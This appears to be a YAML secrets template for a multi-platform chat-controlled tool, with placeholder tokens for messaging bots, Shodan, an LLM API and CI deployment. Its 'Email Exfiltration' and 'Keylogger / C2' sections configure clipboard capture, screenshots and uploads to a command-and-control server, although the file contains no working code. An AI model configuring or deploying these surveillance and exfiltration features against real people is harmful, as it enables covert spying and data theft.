# ============================================================
# YONG-NIAN-V1 — Secret Configuration Template
# ============================================================
# ⚠️  This file is a TEMPLATE. Copy it to secrets.yml and
#     fill in real values. NEVER commit real secrets.
#     For GitLab CI, mirror these as CI/CD Variables
#     (Settings → CI/CD → Variables) with "Masked" + "Protected".
# ============================================================

# ------------------------------------------------------------
# Discord Bot
# ------------------------------------------------------------
discord:
  token: "DISCORD_BOT_TOKEN_HERE"
  channel_id: "DISCORD_CHANNEL_ID_HERE"
  guild_id: "DISCORD_GUILD_ID_HERE"
  prefix: "!"
  admin_role: "Admin"

# ------------------------------------------------------------
# Telegram Bot
# ------------------------------------------------------------
telegram:
  bot_token: "TELEGRAM_BOT_TOKEN_HERE"
  chat_id: "TELEGRAM_CHAT_ID_HERE"
  prefix: "/"
  admin_ids: []

# ------------------------------------------------------------
# Slack Bot
# ------------------------------------------------------------
slack:
  bot_token: "xoxb-SLACK_BOT_TOKEN_HERE"
  app_token: "xapp-SLACK_APP_TOKEN_HERE"
  channel_id: "SLACK_CHANNEL_ID_HERE"
  prefix: "!"

# ------------------------------------------------------------
# WhatsApp (Selenium)
# ------------------------------------------------------------
whatsapp:
  phone_number: "+1234567890"
  prefix: "!"

# ------------------------------------------------------------
# Signal (signal-cli)
# ------------------------------------------------------------
signal:
  phone_number: "+1234567890"
  group_id: "SIGNAL_GROUP_ID_HERE"
  prefix: "!"

# ------------------------------------------------------------
# iMessage (macOS only)
# ------------------------------------------------------------
imessage:
  phone_numbers: []
  prefix: "!"

# ------------------------------------------------------------
# Google Chat
# ------------------------------------------------------------
google_chat:
  webhook_url: "https://chat.googleapis.com/v1/spaces/.../messages?key=..."
  space_id: "SPACE_ID_HERE"
  prefix: "/"

# ------------------------------------------------------------
# SMTP / Email Exfiltration
# ------------------------------------------------------------
email:
  smtp_server: "smtp.example.com"
  smtp_port: 587
  smtp_username: "user@example.com"
  smtp_password: "SMTP_PASSWORD_HERE"
  from_email: "user@example.com"
  tls: true

# ------------------------------------------------------------
# Shodan API
# ------------------------------------------------------------
shodan:
  api_key: "SHODAN_API_KEY_HERE"

# ------------------------------------------------------------
# LLM Provider
# ------------------------------------------------------------
llm:
  api_key: "LLM_API_KEY_HERE"
  api_url: "https://api.openai.com/v1/chat/completions"
  model: "gpt-4"
  max_tokens: 4096
  temperature: 0.7

# ------------------------------------------------------------
# Web Dashboard Auth
# ------------------------------------------------------------
web:
  host: "0.0.0.0"
  port: 5000
  secret_key: "GENERATE_WITH_secrets.token_hex(32)"
  require_auth: false
  username: "admin"
  password_hash: ""

# ------------------------------------------------------------
# Keylogger / C2
# ------------------------------------------------------------
keylogger:
  enabled: false
  hotkey: "f10"
  c2_server: ""
  upload_interval: 30
  screenshot_interval: 60
  capture_clipboard: true

# ------------------------------------------------------------
# GitLab CI/CD Deploy
# ------------------------------------------------------------
ci:
  registry_user: "gitlab-ci-token"
  registry_password: "GLPAT_OR_DEPLOY_TOKEN"
  deploy_host: "your-server.example.com"
  deploy_user: "deployer"
  ssh_private_key: |
    -----BEGIN OPENSSH PRIVATE KEY-----
    ...REPLACE_ME...
    -----END OPENSSH PRIVATE KEY-----
